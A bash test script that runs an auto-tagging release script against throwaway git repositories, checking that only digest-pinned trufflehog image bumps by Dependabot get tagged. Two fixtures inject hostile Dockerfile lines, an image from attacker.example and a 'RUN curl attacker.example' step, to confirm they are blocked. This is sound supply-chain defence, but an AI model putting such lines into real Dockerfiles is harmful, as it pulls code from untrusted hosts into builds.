#!/usr/bin/env bash
# Tests .github/scripts/next-auto-tag.sh against throwaway git repositories.
set -uo pipefail

cd "$(dirname "$0")/.." || exit 1
script=$PWD/.github/scripts/next-auto-tag.sh
failures=0
tmp=$(mktemp -d /tmp/next-auto-tag.XXXXXX)
trap 'rm -rf "$tmp"' EXIT

bot_name='dependabot[bot]'
bot_email='49699333+dependabot[bot]@users.noreply.github.com'

# new_repo <name>: creates a repository whose first commit, by a person, is tagged v1.1.5.
new_repo() {
  repo=$tmp/$1
  git init -q -b main "$repo"
  git -C "$repo" config commit.gpgsign false
  git -C "$repo" config tag.gpgsign false
  # Keep global hooks, such as a secret scanner, out of throwaway commits.
  git -C "$repo" config core.hooksPath /dev/null
  commit_as 'Repo Owner' 'owner@example.com' trufflehog/Dockerfile
  git -C "$repo" tag v1.1.5
}

# commit_as <name> <email> <path>...: changes each path and commits them as the given author.
commit_as() {
  local name=$1 email=$2 path
  shift 2
  for path in "$@"; do
    mkdir -p "$repo/$(dirname "$path")"
    if [ "$path" = trufflehog/Dockerfile ]; then
      # A new pinned image each time, or $image when a test sets it.
      echo "${image:-FROM ghcr.io/trufflesecurity/trufflehog:3.99.$RANDOM@sha256:$(printf '%064d' "$RANDOM")}" > "$repo/$path"
    else
      echo "$RANDOM" >> "$repo/$path"
    fi
    git -C "$repo" add "$path"
  done
  GIT_AUTHOR_NAME=$name GIT_AUTHOR_EMAIL=$email GIT_COMMITTER_NAME=GitHub GIT_COMMITTER_EMAIL=noreply@github.com \
    git -C "$repo" commit -q -m "change $*"
}

bot_commit() {
  commit_as "$bot_name" "$bot_email" "$@"
}

# expect <name> <tag or block> <exact output>: runs the script in the current repository.
expect() {
  local name=$1 want=$2 want_out=$3
  local out got
  if out=$(cd "$repo" && "$script" 2>/dev/null); then
    got=tag
  else
    got=block
  fi
  if [ "$got" != "$want" ]; then
    echo "FAIL $name: want $want, got $got ('$out')"
    failures=$((failures + 1))
  elif [ "$out" != "$want_out" ]; then
    echo "FAIL $name: want '$want_out', got '$out'"
    failures=$((failures + 1))
  else
    echo "ok   $name"
  fi
}

new_repo dockerfile_only
bot_commit trufflehog/Dockerfile
expect tags_dockerfile_only tag v1.1.6

new_repo allowed_paths
bot_commit trufflehog/Dockerfile
bot_commit .github/workflows/lint.yml
bot_commit .pre-commit-config.yaml
bot_commit tests/a.sh
bot_commit docs/a.md
expect tags_with_allowed_paths tag v1.1.6

new_repo without_tag
git -C "$repo" tag -d v1.1.5 >/dev/null
bot_commit trufflehog/Dockerfile
expect blocks_without_tag block 'No release tag found'

new_repo no_commits
expect blocks_no_commits block 'No commits since v1.1.5'

new_repo without_dockerfile
bot_commit .github/workflows/lint.yml
expect blocks_without_dockerfile block 'trufflehog/Dockerfile did not change since v1.1.5'

new_repo action_code
bot_commit trufflehog/Dockerfile dependabot-review/action.yml
expect blocks_action_code block 'Changed outside the allowed paths since v1.1.5: dependabot-review/action.yml'

new_repo other_trufflehog_file
bot_commit trufflehog/Dockerfile trufflehog/action.yml
expect blocks_other_trufflehog_file block 'Changed outside the allowed paths since v1.1.5: trufflehog/action.yml'

new_repo lookalike_paths
bot_commit trufflehog/Dockerfile .github-extra/x docs.md
expect blocks_lookalike_paths block 'Changed outside the allowed paths since v1.1.5: .github-extra/x docs.md'

new_repo rename_out_of_action
commit_as 'Repo Owner' 'owner@example.com' dependabot-review/run.sh
git -C "$repo" tag -f v1.1.5 >/dev/null
mkdir -p "$repo/docs"
git -C "$repo" mv dependabot-review/run.sh docs/run.sh
bot_commit trufflehog/Dockerfile
expect blocks_rename_out_of_action block 'Changed outside the allowed paths since v1.1.5: dependabot-review/run.sh'

new_repo foreign_image
image='FROM attacker.example/trufflehog:3.99.8@sha256:0000000000000000000000000000000000000000000000000000000000000000' bot_commit trufflehog/Dockerfile
expect blocks_foreign_image block 'trufflehog/Dockerfile does not pin a ghcr.io/trufflesecurity/trufflehog version by digest'

new_repo extra_dockerfile_line
image=$'FROM ghcr.io/trufflesecurity/trufflehog:3.99.8@sha256:0000000000000000000000000000000000000000000000000000000000000000\nRUN curl attacker.example' bot_commit trufflehog/Dockerfile
expect blocks_extra_dockerfile_line block 'trufflehog/Dockerfile does not pin a ghcr.io/trufflesecurity/trufflehog version by digest'

new_repo mixed_authors
bot_commit trufflehog/Dockerfile
commit_as 'Repo Owner' 'owner@example.com' docs/a.md
human=$(git -C "$repo" rev-parse --short HEAD)
bot_commit trufflehog/Dockerfile
expect blocks_mixed_authors block "Commits by someone other than Dependabot since v1.1.5: $human"

new_repo name_without_email
commit_as "$bot_name" 'someone@example.com' trufflehog/Dockerfile
spoof=$(git -C "$repo" rev-parse --short HEAD)
expect blocks_name_without_email block "Commits by someone other than Dependabot since v1.1.5: $spoof"

new_repo prerelease_and_unmerged
git -C "$repo" switch -q -c other
commit_as 'Repo Owner' 'owner@example.com' other.txt
git -C "$repo" tag v9.0.0
git -C "$repo" switch -q main
bot_commit trufflehog/Dockerfile
git -C "$repo" tag v1.2.0-rc1
expect ignores_prerelease_and_unmerged_tags tag v1.1.6

new_repo numeric_sort
commit_as 'Repo Owner' 'owner@example.com' docs/a.md
git -C "$repo" tag v1.1.9
commit_as 'Repo Owner' 'owner@example.com' docs/a.md
git -C "$repo" tag v1.1.10
bot_commit trufflehog/Dockerfile
expect sorts_versions_numerically tag v1.1.11

name=caps_reason_length
new_repo long_reason
files=()
for i in $(seq 1 100); do files+=("src/file-with-a-long-name-$i.txt"); done
bot_commit trufflehog/Dockerfile "${files[@]}"
out=$(cd "$repo" && "$script" 2>/dev/null)
if [ "${#out}" -le 500 ] && [[ "$out" == "Changed outside the allowed paths since v1.1.5: "* ]]; then
  echo "ok   $name"
else
  echo "FAIL $name: reason has ${#out} characters"
  failures=$((failures + 1))
fi

exit $((failures > 0))
